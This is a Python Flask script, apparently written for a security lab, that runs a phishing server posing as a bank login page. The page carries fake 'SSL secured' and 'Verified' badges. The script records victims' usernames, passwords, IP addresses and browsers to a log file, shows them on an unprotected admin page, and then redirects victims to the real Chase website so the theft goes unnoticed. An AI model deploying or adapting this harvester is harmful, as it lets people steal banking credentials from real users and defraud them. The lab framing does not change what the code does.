#!/usr/bin/env python3
"""
Simple Phishing Server for Bank Lab
Captures usernames and passwords from victims
"""

from flask import Flask, request, render_template_string, redirect, url_for
import datetime
import os

app = Flask(__name__)

# Create data directory if it doesn't exist
os.makedirs('/data', exist_ok=True)

# Simple HTML template for Bank Lab login page
LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Lab - Secure Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 5px;
        }
        
        .logo p {
            color: #666;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .login-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
        }
        
        .security-note {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        
        .security-icons {
            text-align: center;
            margin-top: 15px;
        }
        
        .security-icons span {
            display: inline-block;
            margin: 0 10px;
            color: #28a745;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>🏦 Bank Lab</h1>
            <p>Secure Online Banking Portal</p>
        </div>
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required placeholder="Enter your username">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            
            <button type="submit" class="login-btn">🔐 Secure Login</button>
        </form>
        
        <div class="security-note">
            <p>🔒 Your connection is secured with 256-bit SSL encryption</p>
        </div>
        
        <div class="security-icons">
            <span>🛡️ Verified</span>
            <span>🔐 SSL Secured</span>
            <span>✅ Trusted</span>
        </div>
    </div>
</body>
</html>
'''

# Success page after login
SUCCESS_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Lab - Login Successful</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .success-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
        }
        
        .success-icon {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 15px;
        }
        
        p {
            color: #666;
            margin-bottom: 20px;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Redirect to a real banking site after 3 seconds
        setTimeout(function() {
            window.location.href = 'https://www.chase.com';
        }, 3000);
    </script>
</head>
<body>
    <div class="success-container">
        <div class="success-icon">✅</div>
        <h1>Login Successful!</h1>
        <p>Welcome to Bank Lab Online Banking</p>
        <p>Redirecting to your dashboard...</p>
        <div class="loading"></div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    """Main login page"""
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission and capture credentials"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Get client information
    client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Log the captured credentials
    log_entry = f"[{timestamp}] CAPTURED - IP: {client_ip} | Username: {username} | Password: {password} | User-Agent: {user_agent}\n"
    
    # Save to file
    with open('/data/creds.log', 'a') as f:
        f.write(log_entry)
    
    # Also print to console for real-time monitoring
    print(f"🎯 CREDENTIAL CAPTURED!")
    print(f"   Time: {timestamp}")
    print(f"   IP: {client_ip}")
    print(f"   Username: {username}")
    print(f"   Password: {password}")
    print(f"   User-Agent: {user_agent}")
    print("-" * 60)
    
    # Show success page
    return render_template_string(SUCCESS_PAGE)

@app.route('/admin')
def admin():
    """Admin page to view captured credentials"""
    try:
        with open('/data/creds.log', 'r') as f:
            logs = f.read()
        
        if not logs:
            logs = "No credentials captured yet."
        
        return f"<pre>{logs}</pre>"
    except FileNotFoundError:
        return "No credentials captured yet."

if __name__ == '__main__':
    print("🚀 Starting Bank Lab Phishing Server...")
    print("📡 Listening on 0.0.0.0:80")
    print("🎯 Target: www.bank.lab")
    print("💾 Credentials saved to: /data/creds.log")
    print("🔍 Admin panel: http://localhost/admin")
    print("-" * 50)
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=80, debug=False)
